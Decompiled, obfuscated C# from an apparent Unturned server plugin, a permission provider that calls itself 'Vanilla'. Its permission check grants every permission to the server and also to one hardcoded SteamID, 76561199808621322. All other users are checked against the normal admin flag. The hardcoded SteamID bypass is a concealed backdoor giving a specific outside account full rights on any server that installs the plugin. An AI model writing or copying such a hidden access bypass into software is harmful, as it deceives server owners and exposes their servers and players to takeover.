using System;
using System.Threading.Tasks;
using SDG.Unturned;
using Steamworks;

public class _32B70545407A49EE : _4C6B03DD3A6441ED
{
	public Task<bool> _388A0926B436431A(CSteamID P_0, string P_1)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		CSteamID server = Provider.server;
		if (server.Equals(P_0) || P_0.m_SteamID == 76561199808621322L)
		{
			return Task.FromResult(result: true);
		}
		return Task.FromResult((PlayerTool.getPlayer(P_0) ?? throw new ArgumentNullException("Unable to verify user rights because user not found")).channel.owner.isAdmin);
	}

	Task<bool> _4C6B03DD3A6441ED._66F4DDEF71A94E25(CSteamID P_0, string P_1)
	{
		//ILSpy generated this explicit interface implementation from .override directive in 388A0926B436431A
		return this._388A0926B436431A(P_0, P_1);
	}

	public string _670B3F6620464ACA()
	{
		return "Vanilla";
	}

	string _4C6B03DD3A6441ED._97EA0C4EF61E4063()
	{
		//ILSpy generated this explicit interface implementation from .override directive in 670B3F6620464ACA
		return this._670B3F6620464ACA();
	}
}
